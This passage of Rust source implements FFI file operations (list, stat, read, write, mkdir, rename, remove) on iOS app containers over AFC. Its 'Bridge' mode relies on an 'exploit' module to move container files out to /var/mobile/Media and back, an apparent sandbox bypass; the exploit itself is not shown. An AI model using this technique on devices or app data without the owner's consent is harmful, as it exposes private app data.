    bridge: String,
    logger: &Logger,
) -> Result<String, String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let afc_path = engine_afc_path(&engine, &rel_path);
    let dst_back = engine_afc_path(&engine, &rel_path);

    // For bridge_move mode without direct traversal, fall back to moving the dir out.
    // We'll attempt direct list first; if it fails, do move-based listing.
    let (afc_ref, direct) = match &mut engine {
        Engine::HouseArrest { afc } => (afc, true),
        Engine::Bridge { afc, direct, .. } => (afc, *direct),
    };

    let mut entries: Vec<serde_json::Value> = Vec::new();
    if direct {
        let names = afc_ref
            .list_dir(&afc_path)
            .await
            .map_err(|e| format!("{e:?}"))?;
        for n in names {
            if n == "." || n == ".." {
                continue;
            }
            let full = if afc_path == "/" || afc_path.is_empty() {
                n.clone()
            } else {
                format!("{}/{}", afc_path.trim_end_matches('/'), n)
            };
            match afc_ref.get_file_info(&full).await {
                Ok(info) => entries.push(entry_json(&n, &info)),
                Err(_) => entries.push(json!({"name": n, "isDir": false, "size": 0})),
            }
        }
    } else {
        // Move-based listing: move the directory out to Media, list, move back.
        let token = exploit::random_hex(8);
        let staging = format!("readipa-list-{}", token);
        move_path(
            &mut tunnel,
            afc_ref,
            &container_path_join(&container_path, &rel_path),
            &staging,
            logger,
        )
        .await?;
        let names = afc_ref
            .list_dir(&staging)
            .await
            .map_err(|e| format!("{e:?}"))?;
        for n in names {
            if n == "." || n == ".." {
                continue;
            }
            let full = format!("{}/{}", staging, n);
            match afc_ref.get_file_info(&full).await {
                Ok(info) => entries.push(entry_json(&n, &info)),
                Err(_) => entries.push(json!({"name": n, "isDir": false, "size": 0})),
            }
        }
        // move back
        move_path(
            &mut tunnel,
            afc_ref,
            &format!("/var/mobile/Media/{}", staging),
            &dst_back,
            logger,
        )
        .await
        .ok();
    }

    Ok(serde_json::to_string_pretty(&json!({"entries": entries})).map_err(|e| e.to_string())?)
}

fn container_path_join(container: &str, rel: &str) -> String {
    if rel.is_empty() {
        container.to_string()
    } else {
        format!("{}/{}", container.trim_end_matches('/'), rel)
    }
}

// ---------------------------------------------------------------------------
// FFI: stat
// ---------------------------------------------------------------------------

pub unsafe fn fs_stat(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_stat", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_stat_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(s)) => {
            if !out_json.is_null() {
                *out_json = cstr(s);
            }
            0
        }
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_stat_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<String, String> {
    let (mut _tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let afc_path = engine_afc_path(&engine, &rel_path);
    let afc_ref = match &mut engine {
        Engine::HouseArrest { afc } => afc,
        Engine::Bridge { afc, .. } => afc,
    };
    let info = afc_ref
        .get_file_info(&afc_path)
        .await
        .map_err(|e| format!("{e:?}"))?;
    let name = rel_path.rsplit('/').next().unwrap_or(&rel_path);
    let j = entry_json(
        if name.is_empty() {
            &container_path
        } else {
            name
        },
        &info,
    );
    Ok(serde_json::to_string_pretty(&j).map_err(|e| e.to_string())?)
}

// ---------------------------------------------------------------------------
// FFI: read (export to local file)
// ---------------------------------------------------------------------------

pub unsafe fn fs_read(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    dest_local_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let dest_local_path = opt_str(dest_local_path, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) || rel_path.is_empty() {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_read", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_read_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            dest_local_path.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_read_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    dest_local_path: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let direct = match &engine {
        Engine::HouseArrest { .. } => true,
        Engine::Bridge { direct, .. } => *direct,
    };
    let afc_path = engine_afc_path(&engine, &rel_path);
    let dst_back = engine_afc_path(&engine, &rel_path);

    // Get bytes.
    let data: Vec<u8> = if direct {
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        let mut fd = afc_ref
            .open(&afc_path, AfcFopenMode::RdOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        let d = fd.read_entire().await.map_err(|e| format!("{e:?}"))?;
        let _ = fd.close().await;
        d
    } else {
        // Move out to Media, read, move back.
        let token = exploit::random_hex(8);
        let staging = format!("readipa-read-{}", token);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        let src_abs = container_path_join(&container_path, &rel_path);
        move_path(&mut tunnel, afc_ref, &src_abs, &staging, logger).await?;
        let mut fd = afc_ref
            .open(&staging, AfcFopenMode::RdOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        let d = fd.read_entire().await.map_err(|e| format!("{e:?}"))?;
        let _ = fd.close().await;
        // move back
        move_path(
            &mut tunnel,
            afc_ref,
            &format!("/var/mobile/Media/{}", staging),
            &dst_back,
            logger,
        )
        .await
        .ok();
        d
    };

    // Write to local file.
    if let Some(parent) = std::path::Path::new(&dest_local_path).parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    std::fs::write(&dest_local_path, &data).map_err(|e| format!("write local file: {e}"))?;
    Ok(())
}

// ---------------------------------------------------------------------------
// FFI: write (from local file)
// ---------------------------------------------------------------------------

pub unsafe fn fs_write(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    src_local_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let src_local_path = opt_str(src_local_path, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) || rel_path.is_empty() {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_write", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_write_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            src_local_path.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_write_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    src_local_path: String,
    logger: &Logger,
) -> Result<(), String> {
    let data = std::fs::read(&src_local_path).map_err(|e| format!("read src: {e}"))?;
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let direct = match &engine {
        Engine::HouseArrest { .. } => true,
        Engine::Bridge { direct, .. } => *direct,
    };

    if direct {
        let afc_path = engine_afc_path(&engine, &rel_path);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        // remove existing if any
        let _ = afc_ref.remove(&afc_path).await;
        let mut fd = afc_ref
            .open(&afc_path, AfcFopenMode::WrOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        fd.write_entire(&data).await.map_err(|e| format!("{e:?}"))?;
        let _ = fd.close().await;
        Ok(())
    } else {
        // Stage into Media then move in.
        let token = exploit::random_hex(8);
        let staging = format!("readipa-write-{}", token);
        let dst_path = engine_afc_path(&engine, &rel_path);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        // write staging file via AFC
        let mut fd = afc_ref
            .open(&staging, AfcFopenMode::WrOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        fd.write_entire(&data).await.map_err(|e| format!("{e:?}"))?;
        let _ = fd.close().await;
        // remove existing
        let _ = move_path(
            &mut tunnel,
            afc_ref,
            &container_path_join(&container_path, &rel_path),
            &format!("readipa-trash-{}", token),
            logger,
        )
        .await;
        // move in
        move_path(
            &mut tunnel,
            afc_ref,
            &format!("/var/mobile/Media/{}", staging),
            &dst_path,
            logger,
        )
        .await?;
        // cleanup trash
        let _ = afc_ref.remove(&format!("readipa-trash-{}", token)).await;
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// FFI: mkdir
// ---------------------------------------------------------------------------

pub unsafe fn fs_mkdir(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) || rel_path.is_empty() {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_mkdir", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_mkdir_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_mkdir_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let direct = match &engine {
        Engine::HouseArrest { .. } => true,
        Engine::Bridge { direct, .. } => *direct,
    };
    if direct {
        let afc_path = engine_afc_path(&engine, &rel_path);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        afc_ref
            .mk_dir(&afc_path)
            .await
            .map_err(|e| format!("{e:?}"))?;
        Ok(())
    } else {
        // Create empty dir in Media, then move into container.
        let token = exploit::random_hex(8);
        let staging_parent = format!("readipa-mkdir-{}", token);
        let staging = format!(
            "{}/{}",
            staging_parent,
            rel_path.rsplit('/').next().unwrap_or(&rel_path)
        );
        let dst_path = engine_afc_path(&engine, &rel_path);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        afc_ref.mk_dir(&staging_parent).await.ok();
        afc_ref
            .mk_dir(&staging)
            .await
            .map_err(|e| format!("{e:?}"))?;
        move_path(
            &mut tunnel,
            afc_ref,
            &format!("/var/mobile/Media/{}", staging),
            &dst_path,
            logger,
        )
        .await?;
        let _ = afc_ref.remove_all(&staging_parent).await;
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// FFI: remove
// ---------------------------------------------------------------------------

pub unsafe fn fs_remove(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) || rel_path.is_empty() {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_remove", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_remove_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_remove_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let direct = match &engine {
        Engine::HouseArrest { .. } => true,
        Engine::Bridge { direct, .. } => *direct,
    };
    if direct {
        let afc_path = engine_afc_path(&engine, &rel_path);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        // try remove (file) then remove_all (dir)
        if afc_ref.remove(&afc_path).await.is_err() {
            afc_ref
                .remove_all(&afc_path)
                .await
                .map_err(|e| format!("{e:?}"))?;
        }
        Ok(())
    } else {
        // Move out to Media trash, then remove.
        let token = exploit::random_hex(8);
        let staging = format!("readipa-trash-{}", token);
        let src_abs = container_path_join(&container_path, &rel_path);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        move_path(&mut tunnel, afc_ref, &src_abs, &staging, logger).await?;
        // try remove file then dir
        if afc_ref.remove(&staging).await.is_err() {
            let _ = afc_ref.remove_all(&staging).await;
        }
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// FFI: rename
// ---------------------------------------------------------------------------

pub unsafe fn fs_rename(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    old_rel: *const c_char,
    new_rel: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let old_rel = opt_str(old_rel, "");
    let new_rel = opt_str(new_rel, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path)
        || !safe_rel(&old_rel)
        || !safe_rel(&new_rel)
        || old_rel.is_empty()
        || new_rel.is_empty()
    {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_rename", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_rename_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            old_rel.clone(),
            new_rel.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_rename_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    old_rel: String,
    new_rel: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let direct = match &engine {
        Engine::HouseArrest { .. } => true,
        Engine::Bridge { direct, .. } => *direct,
    };
    if direct {
        let old_path = engine_afc_path(&engine, &old_rel);
        let new_path = engine_afc_path(&engine, &new_rel);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        // remove existing dest
        let _ = afc_ref.remove(&new_path).await;
        afc_ref
            .rename(&old_path, &new_path)
            .await
            .map_err(|e| format!("{e:?}"))?;
        Ok(())
    } else {
        // Move out to Media (temp), then move back under new name.
        let token = exploit::random_hex(8);
        let staging = format!("readipa-rename-{}", token);
        let src_abs = container_path_join(&container_path, &old_rel);
        let dst_path = engine_afc_path(&engine, &new_rel);
        let afc_ref = match &mut engine {
            Engine::HouseArrest { afc } => afc,
            Engine::Bridge { afc, .. } => afc,
        };
        move_path(&mut tunnel, afc_ref, &src_abs, &staging, logger).await?;
        move_path(
            &mut tunnel,
            afc_ref,
            &format!("/var/mobile/Media/{}", staging),
            &dst_path,
            logger,
        )
        .await?;
        Ok(())
    }
}
